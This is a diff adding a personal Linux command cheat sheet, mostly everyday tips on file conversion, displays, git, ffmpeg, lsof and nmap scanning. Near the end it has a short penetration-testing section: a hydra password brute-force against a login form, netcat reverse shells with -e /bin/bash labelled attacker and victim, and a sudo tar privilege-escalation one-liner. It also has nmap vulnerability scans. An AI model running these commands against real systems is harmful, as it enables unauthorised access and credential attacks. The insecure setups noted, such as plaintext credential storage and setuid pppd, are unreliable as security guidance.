@@ -1,0 +1,471 @@
+# convert image to pdf
+convert 1.png 2.png out.pdf
+
+# concatenate (merge) PDFs
+pdfunite 1.pdf 2.pdf out.pdf
+
+# with specific pages
+mutool merge 1.pdf [pages] 2.pdf [pages] -o out.pdf
+
+# convert pdf to text
+pdftotext -layout in.pdf out.txt
+
+# splitting pdf pages
+mutool poster -y 2 in.pdf out.pdf  # With mupdf-tools to split every page vertically into two pages
+
+# read word docs and excel spreadsheets to stdout with catdoc & xls2csv
+catdoc
+xls2csv
+
+# convert Word .docx to text
+docx2txt
+# put this in your .vimrc to view docx files in vim with docx2txt
+"use docx2txt.pl to allow VIm to view the text content of a .docx file directly.
+autocmd BufReadPre *.docx set ro
+autocmd BufReadPost *.docx %!docx2txt.pl
+
+# how to create fat32 usb drive
+# format fat32 partition
+lsblk
+sudo fdisk /dev/sdc  # might also be sdb, sda, sdd - be careful!
+# fdisk prompt >
+o  # create new empty dos partition table (mbr)
+n  # new partition
+t  # change type
+b  # type  b  (W95 FAT32)
+w  # write
+# bash prompt $
+mkfs.vfat -F 32 -n your_label /dev/sdc1
+# done
+
+# reduce size of videos with ffmpeg, make videos smaller without losing quality
+ffmpeg -i inputfile.mkv -vcodec libx265 -crf 28 outputfile.mp4
+# do this for every file in directory (for loop)
+for file in *; do ffmpeg -i "$file" -vcodec libx265 -crf 31 x_"$file"; done
+
+# reduce size of a video by reducing frame size (quick rendering)
+ffmpeg -i input.mkv -vf "scale=iw/2:ih/2" half_the_frame_size.mkv
+ffmpeg -i input.mkv -vf "scale=iw/3:ih/3" a_third_the_frame_size.mkv
+ffmpeg -i input.mkv -vf "scale=iw/4:ih/4" a_fourth_the_frame_size.mkv
+
+# create a super fast ram disk
+mkdir -p /mnt/ram
+mount -t tmpfs tmpfs /mnt/ram -o size=8192M
+
+# open the last command in your editor
+fc
+
+# exit terminal but leave all processes running
+disown -a && exit
+
+# leave a busy terminal but leave process running in background. (e.g. long copies or scp)
+Ctrl+Z
+bg
+disown
+exit
+
+### multiple displays ###
+# show what displays are connected and their names
+xrandr -q
+# mirror displays
+xrandr --output HDMI-1-2 --auto
+# extend to the right
+xrandr --output eDP1 --auto --output HDMI-1-2 --auto --right-of eDP1  # eDP1 is laptop, HDMI-1-2 is external Monitor
+# turn off a monitor
+xrandr --output HDMI-1-2 --off
+
+# dwm patching guide video
+https://www.youtube.com/watch?v=UEmPboaTDpQ
+
+# basic gnu/linux font guide using fontconfig
+https://jichu4n.com/posts/how-to-set-default-fonts-and-font-aliases-on-linux/
+
+# show current font config
+for family in serif sans-serif monospace Arial Helvetica Verdana "Times New Roman" "Courier New"; do
+  echo -n "$family: "
+  fc-match "$family"
+done
+
+# set resolution in a linux vm automatically, auto resizing
+VBoxClient-all &
+
+# set custom resolution with xrandr
+xrandr --output HDMI-1 --mode 1920x1080  # HDMI-1 is queried with `xrandr -q`
+
+# fix corrupt zsh history file
+cd ~
+mv .zsh_history .zsh_history_bad
+strings .zsh_history_bad > .zsh_history
+fc -R .zsh_history
+
+# signal to dwmblocks
+pkill -RTMIN+1 dwmblocks
+
+#####################################################
+# how to patch suckless dwm manually with git, github
+#####################################################
+cd ~/.local/src/dwm
+git checkout master
+make clean && rm -f config.h && git reset --hard origin/master
+# switch to specific branch you want to edit
+# 'git branch branch_name' to create a branch
+git checkout config
+    ################
+    # manual editing
+    ################
+    vim config.def.h
+    # add file(s) you edited
+    git add config.def.h
+    # commit changes
+    git commit -m config
+
+    ############################
+    # using git to apply a patch
+    ############################
+    git apply dwm-statuscmd-6.2.diff
+    # add file(s) you edited
+    git add dwm.c
+    # commit changes
+    git commit -m statuscmd
+# back to master branch and merge
+git merge config
+git merge yourbranch2
+    # if there are conflicts
+        edit the specific files manually and watch out for lines with '=====' '<<<<<' '>>>>>>'
+            # then this
+            git add file1
+            git add file2
+            git commit -m your_fix_message
+            # or this
+            git merge --continue
+
+# save credentials for git cli for push and pull
+git config --global credential.helper store
+
+#################################################
+# create your own github repo on the command line
+#################################################
+# create repo on github
+curl -u 'ThomasStadler98' https://api.github.com/user/repos -d '{"name":"testrepo"}'
+# put your password in the prompt
+# cd into your directory
+cd testrepo
+# initialize repo
+git init
+# add untracked files
+git add file1 file2 dir1/ file3
+    # or add all
+    git add .
+# first commit
+git commit -m "initial commit"
+# add github remote
+git remote add origin https://github.com/ThomasStadler98/testrepo.git
+# set upstream && first push
+git push -u origin master
+
+# make && install
+make && sudo make clean install
+
+# disable cpu turbo boost
+# intel_pstate
+echo 1 > /sys/devices/system/cpu/intel_pstate/no_turbo
+
+######################
+# lsof guide
+######################
+# find out who is looking what files and commands
+lsof -i -u username
+# list user specific open files
+lsof -u username
+# find processes running on specific port
+lsof -i TCP:22
+# list all network connections
+lsof -i
+# list only IPv4 & IPv6 open network files
+lsof -i 4
+lsof -i 6
+# list open files of port ranges
+lsof -i TCP:1-1024
+# exclude user with ^ char
+lsof -i -u^root
+# search by PID
+lsof -p 1
+# kill all activity of particular user
+kill -9 $(lsof -t -u username)
+
+# unzip a 7zip archive
+7z x filename
+
+# restart dwmblocks statusbar
+kill -9 `pidof dwmblocks` && setsid dwmblocks &
+
+# green PS1 prompt
+${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w \$\[\033[00m\]
+
+# regex, regular expressions
+    # match 5 digit number
+    ^[0-9]{5}$
+    # match any number
+    ^[0-9]+$
+    # do not match numbers
+    ^[^0-9]+$
+    # match phone number with optional dashes. e.g. 850-555-2345
+    ^[0-9]{3}-?[0-9]{3}-?[0-9]{4}$
+    # match an email. e.g. bob.smith@example.org
+    ^[a-zA-Z0-9._-]+@[a-zA-Z0-9]+\.[a-zA-Z]{2,3}$
+    ^[\w\d._-]+@[\w\d]+\.[\w]{2,3}$  # \w and \d also match numbers in foreign languages and little bit more
+
+# terminate a no longer responding ssh session:
+press "Enter", "~" and "." one after another in that order.
+    # if you are connected from A to B, and from B to C:
+    press ~~ tilde twice
+
+# netstat usage example
+netstat -pant
+
+# show  ports on which the system listens on
+ss -tnl
+
+# ping all addresses on the network
+nmap -sP 192.168.0.0/24
+
+# check ports on the network
+nmap -sT -p 80,443 192.168.0.0/24
+
+# check dns mx record
+dig fh-burgenland.at mx
+
+# check tcp port on a network / another machine
+nmap -sT -p 25 mxgw1.fh-burgenland.at
+
+# trace a route on the lan, wan
+traceroute mxgw1.fh-burgenland.at
+
+# terminal based browsers / check websites for usability / blind people
+w3m, lynx, elinks
+
+# host videos on your own website
+with peertube
+
+# check if website exists
+wget -S --spider https://www.fh-burgenland.at
+
+# set proxy server
+export http_proxy="http://proxy.domain.org"
+export https_proxy="https://proxy.domain.org"
+
+# disable proxy for specific addresses
+export no_proxy=".orf.at,.gmail.com"
+
+# ssh tunneling
+ssh -L 55555:127.0.0.1:22 -L 44444:192.168.0.88:22 thomas@arch
+
+# ssh subshells instead of cp -r
+ssh server_ip "( cd / ; tar -cf - bin sbin )" | tar -x -f -
+
+# remote shell with rsync
+rsync -e ssh root@server:rootfs /mnt/neuer_server
+
+# start mpv with audio only
+mpv --vid=no file.mp4
+# or
+mpv --no-video file.mp4
+
+# connect to network with secret on boot (NetworkManager) / fix problem: network is not connected unless logged in
+use  nm-applet  in system tray or  nm-connection-editor
+Select the connection you want to work with and click the Edit button
+Check the boxes “Connect Automatically” and “Available to all users”
+Additionally, ensure that under "Wi-Fi Security", "Store password for all users (not encrypted)" is selected
+Log out and log back in to complete.
+
+# pppd: must be root to run pppd, since it is not setuid-root / netExtender error
+sudo chmod 4755 /usr/sbin/pppd
+
+# signal dwmblocks
+pkill -RTMIN+12 dwmblocks
+
+# unicode emojis
+https://en.wikipedia.org/wiki/Emoji
+
+# Make pacman and yay colorful and adds eye candy on the progress bar because why not.
+grep -q "^Color" /etc/pacman.conf || sed -i "s/^#Color$/Color/" /etc/pacman.conf
+grep -q "ILoveCandy" /etc/pacman.conf || sed -i "/#VerbosePkgLists/a ILoveCandy" /etc/pacman.conf
+
+pacman --noconfirm -Sy archlinux-keyring >/dev/null 2>&1
+
+# write iso to usb drive with dd
+sudo dd if=/path/to/iso of=/dev/devicename status=progress
+#sudo dd if=/path/to/iso of=/dev/devicename status=progress oflag=sync
+
+# Control and monitor S.M.A.R.T. enabled ATA and SCSI Hard Drives
+smartctl  # arch package smartmontools
+
+####################
+# screensaver in X11
+####################
+# install xss-lock and autostart it in xinitrc with an appropriate screenlock program (e.g. slock)
+sudo pacman -S xss-lock slock
+# put the following in xinitrc or configure in xorg conf file
+    xset s off
+    xset dpms 300 300  # screensaver after 5 minutes
+# disable screensaver
+xset s off
+xset dpms 0 0 0
+
+# list attached graphic drivers
+xrandr --listproviders
+
+# show default graphic card (if you have multiple cards)
+glxinfo | grep "OpenGL renderer"
+
+# use decimal numbers in bc calculator
+scale=4
+
+######
+# nmap
+######
+# arp/mac address scan / non intrusive
+nmap -n -PR -sn 192.168.0.0/24
+# tcp connect
+nmap -n -sT -p80,443,445 192.168.0.0/24
+nmap -n -sT -p 1-1000 192.168.0.0/24
+# syn only / will leave connection open remote host / --top-ports = statistically most popular
+sudo nmap -n -sS --top-ports 100 192.168.0.0/24
+# try ssh handshake / get ssh protocol/version
+sudo nmap -n -sS --top-ports 100 -sV 192.168.0.0/24
+
+# shortcuts while nmap is running
+# spacebar
+# p
+# shift+p
+
+# timing
+-T4
+
+# save to file
+-oA
+
+# OS detection
+-O
+nmap -n -sS -T4 --top-ports 100 -sV -O -oA scan1 192.168.0.0/24
+
+# run all nmap scripts
+-A
+
+# check smb protocols / versions
+nmap -n -sS -T4 --top-ports 1000 -sV --script=smb-protocols 192.168.0.0/24
+
+# check rdp protocols
+nmap -n -sS -T4 -p3389 -sV --script=rdp-enum-encryption 192.168.2.0/24
+
+# vulnerability scans with scripts
+nmap -n -sS -T4 -p135,139,445 -sV --script=smb-vuln-ms17-010 192.168.2.0/24
+nmap -n -sS -T4 -p135,139,445 -sV --script=vuln 192.168.2.0/24
+
+# port scan website tool
+https://www.shodan.io
+
+# how to use transmission-cli torrent program
+# start daemon
+transmission-daemon
+# list torrents
+transmission-remote -l
+# add torrent
+transmission-remote -a "https://yourlink.org/file.torrent"
+# add magent link torrent
+transmission-remote -a "magnet:?xt=urn:btih:9f9m%3A6969"
+# remove a torrent
+# first get the ID with -l list; then
+transmission-remote -t 3 -r
+transmission-remote -t 3,4 -r
+transmission-remote -t all -r
+
+# backup root dir / with rsync and exclude some dirs
+sudo rsync -aAXv / --exclude={"/dev/*","/proc/*","/sys/*","/tmp/*","/run/*","/mnt/*","/media/*","/lost+found"} /mnt
+# https://ostechnix.com/backup-entire-linux-system-using-rsync/
+
+# convert gif to png
+convert -verbose -coalesce file.gif file.png
+
+# kill idle ssh session
+sudo pkill -9 -t pts/9
+
+##########################################################
+# enable password saving / gnome-keyring / automatic login
+##########################################################
+# https://wiki.archlinux.org/index.php/GNOME/Keyring
+# Dec 2020 Arch Linux method
+
+# change file /etc/pam.d/login:
+#Add
+auth optional pam_gnome_keyring.so
+#at the end of the auth section and
+session optional pam_gnome_keyring.so auto_start
+#at the end of the session section.
+
+# add following 2 lines to .xinitrc
+eval $(/usr/bin/gnome-keyring-daemon --start --components=pkcs11,secrets,ssh)
+export SSH_AUTH_SOCK
+##########################################################
+
+# determine, find out port on which a program is running, listening
+netstat -lnp | grep mysql
+
+# ssh tunnel / port forwarding
+ssh -L 8888:192.168.100.120:3306 remote@35.166.37.12 -p 20022 -N
+# 127.0.0.1:8888 is now forwarded to 192.168.100.120:3306 and the ssh tunnel goes through 35.166.37.12 port 20022
+
+# nc http check
+nc -vvn 192.168.10.11 80
+GET /
+
+# hydra password brute force a HTTP login site
+hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-500.txt 192.168.10.11 http-post-form "/bms/login.php:user=^USER^&password=^PASS^:Wrong username or password"
+
+# nmap fast port scan
+nmap -sV 192.168.10.11
+
+# reverse shell to a local port
+# start shell on a port
+nc -l -p 1234 -e /bin/bash
+# get access to that reverse shell from another server
+nc -vvn 192.168.10.11 1234
+
+# reverse shell to a remote server port
+# attacker machine
+nc -lvp 443
+# victim machine
+nc -nv 192.168.10.10 443 -e /bin/bash
+
+# start command prompt (get a full shell) in a reverse hacked shell
+script -qc /bin/bash /dev/null
+
+http://pentestmonkey.net
+
+# get root shell if you only have sudo access to /usr/bin/tar
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+# handy script linenum
+bash /tmp/linenum...... TODO
+
+###########################################
+# wireshark
+###########################################
+# display filters
+#################
+# all icmp echo requests
+icmp.type==8 and icmp.code==0
+# all traffic communicating on TCP port 3389
+tcp.port == 3389
+# all packets where destination port is 3389
+tcp.dstport == 3389  # tcp.srcport for source port
+# all traffic between 2 ip addresses
+ip.addr == 192.168.1.117 and ip.addr == 192.168.1.151  # && can also be used instead of  and
+# all hosts that make HTTP GET requests to cisco.com
+http.request.method == GET and http.host contains "cisco.com"
+# packets where source ip is x
+ip.src == 192.168.1.117
+###########################################
+
+# uncommon http user agents
+cat http.log | bro-cut user_agent | sort | uniq | grep -vi -e ^mozilla -e ^opera -e ^microsoft > uncommon_user_agents.txt
